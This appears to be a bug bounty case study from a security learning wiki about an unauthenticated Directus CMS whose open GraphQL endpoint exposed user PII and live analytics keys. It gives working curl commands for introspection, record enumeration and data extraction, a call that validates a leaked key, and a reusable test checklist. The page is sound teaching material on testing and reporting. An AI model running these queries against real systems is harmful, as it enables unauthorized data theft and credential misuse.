# CS-01: Unauthenticated GraphQL / Directus CMS

← [[Case-Studies-Overview]]

**Vuln class:** Broken Access Control + Sensitive Data Exposure  
**Severity:** P2 / CVSS 7.5 HIGH  
**Program:** Large media company VDP (Intigriti)  
**Reports submitted:** 2 separate reports from the same root cause

---

## TL;DR (30 seconds)

A media company ran multiple Directus CMS instances — one managing app configuration with API keys, another managing user data for a competition platform. Both had the same misconfiguration: Directus's public role was left with read access on all collections, and GraphQL introspection was enabled. No credentials needed. One HTTP POST to `/graphql` and you could dump everything.

The junior lesson here is that **finding a pattern once means checking everywhere**. The same root cause produced two different P2 findings on the same program.

---

## How It Was Found

**Step 1: Fingerprinting during subdomain enumeration**

When probing hundreds of live hosts, the `x-powered-by: Directus` response header stood out. Directus is a headless CMS with a well-documented API — the moment you see it, you know what endpoints to test.

```bash
# During bulk header checking:
curl -s -I https://target-cms-staging.example.com | grep -i powered
# x-powered-by: Directus
```

**Step 2: Test introspection immediately**

GraphQL introspection is a standard diagnostic endpoint that returns the full schema. It should be disabled on production. On Directus, it's enabled by default.

```bash
curl -s https://target-cms.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

If the response is `200 OK` with a list of type names — and no `Authorization` header was sent — you have unauthenticated introspection. That's the first flag.

**Step 3: Enumerate collections**

Once you know introspection is open, query the actual data:

```bash
# What collections exist?
curl -s https://target-cms.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# How many records in each collection?
curl -s https://target-cms.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users_aggregated { count { id } } }"}'
```

**Step 4: Extract the data**

```bash
# Extract user records
curl -s https://target-cms.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users(limit: 10) { id username email full_name country { name } } }"}'

# Extract app configuration with credentials
curl -s https://target-cms.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ app_consumers(limit: -1) { consumer_name environment option_overrides } }"}'
```

---

## What Was Found (Sanitized)

### Instance 1: App Configuration CMS

- 200+ `app_consumer` records across production, QA, and staging
- Each record stored the integration keys for analytics services
- The keys were **active** — confirmed by calling the analytics service API directly:

```bash
curl -s https://api.analyticsservice.com/v1/identify \
  -H "Content-Type: application/json" \
  -d '{"writeKey": "REDACTED_KEY_1", "userId": "security-test", "traits": {}}'
# Response: {"success": true}
```

`{"success": true}` means the key is valid and would accept writes. That confirms impact beyond just "key was visible."

- Also exposed: internal API URLs (RTM service, analytics stream, debug endpoints)

### Instance 2: Competition Platform CMS

- 140 user records: email, username, real name, identity system ID, country
- 47 audition records (competition applications): first name, last name, email, **phone number**
- 30 CMS admin accounts: real employee emails and contractor accounts, their auth providers, last login timestamps

The supplement finding: even the `directus_users` system collection (CMS admin accounts) was readable without authentication. The `password` and `token` fields were masked by Directus (`**********`), so no direct admin takeover — but it gave a full list of privileged accounts including their identity providers.

---

## Why It Works: Root Cause

Directus CMS has a built-in **"public" role** that controls what unauthenticated visitors can see. By default in some Directus versions, this role is configured permissively — or new collections inherit read access for the public role when created.

When a developer sets up a Directus instance for the first time, the focus is on getting the CMS working, not on locking down the public permissions. The GraphQL introspection endpoint is also enabled by default.

The result: any unauthenticated visitor can query the full database via GraphQL.

**The pattern repeats** because it's a configuration default, not a code bug. Every Directus instance deployed without explicitly hardening the public role has this issue.

---

## CVSS Breakdown

```
AV:N  - API accessible over the internet
AC:L  - No special conditions; single HTTP POST
PR:N  - Zero authentication
UI:N  - No user interaction
S:U   - Scoped to the target company's systems
C:H   - Active credentials and/or user PII exposed
I:N   - Read-only (no mutations accessible without auth)
A:N   - No availability impact

Score: 7.5 HIGH (for PII exposure) / 7.3 HIGH (for credentials)
```

**VRT:** `Sensitive Data Exposure → Credentials → Third-Party Credentials` → **P2**

---

## The "Same Root Cause, Two Reports" Lesson

This is one of the most important habits a bug bounty hunter can develop:

> When you find a misconfiguration, immediately ask: *does the same misconfiguration exist elsewhere on this target?*

The workflow:
1. Find unauthenticated Directus introspection on one subdomain
2. `subfinder -d example.com | grep -i directus` or check all live hosts for the header
3. Test each Directus instance with the same introspection query
4. If you find another one with different data — that's a second report

Same 10 minutes of work, potentially two P2 findings. This is called **pattern replication**.

---

## What Gets a Report Marked Valid

Based on how these reports were received:

1. **Prove authentication is not required** — the curl command with zero auth headers producing 200 OK
2. **Show the data** — redacted in the report, but confirm you queried and received it
3. **Prove active impact where possible** — the `{"success": true}` from the analytics API confirms the key works, not just that it's exposed
4. **Count the records** — `users_aggregated { count { id } }` gives you the scale (140 users, 47 auditions)
5. **State the privacy/compliance angle** — phone numbers + emails for EU users → GDPR reportable incident, regardless of it being labeled "staging"

> [!WARNING]
> **Staging ≠ lower severity.** If staging contains real production user data (and it often does — databases get copied over), the data exposure is just as serious as if it were production. Triagers know this. State it explicitly in your report.

---

## Practice This

1. **PortSwigger GraphQL labs** — `labs.portswigger.net/websecurity/graphql` — accessing the labs covers introspection, IDOR via GraphQL, and mutation-based attacks
2. **GraphQL introspection testing** — [[GraphQL-Security]]
3. **Test any Directus instance** you find in CTFs or bug bounty — check the public role permissions first

---

## Quick Reference: Directus Test Checklist

```bash
# 1. Confirm Directus and check introspection
curl -s https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool

# 2. List all custom collections
curl -s https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'

# 3. Check system collections (admin accounts)
curl -s "https://TARGET/users?limit=10&fields=email,role,status"

# 4. Count records before dumping
curl -s https://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ COLLECTION_aggregated { count { id } } }"}'
```

---

*Related: [[GraphQL-Security]] | [[A01-Broken-Access-Control]] | [[A02-Cryptographic-Failures]] | [[Reporting-Guide]]*

*Sources: Real Intigriti VDP submissions, Directus CMS documentation*
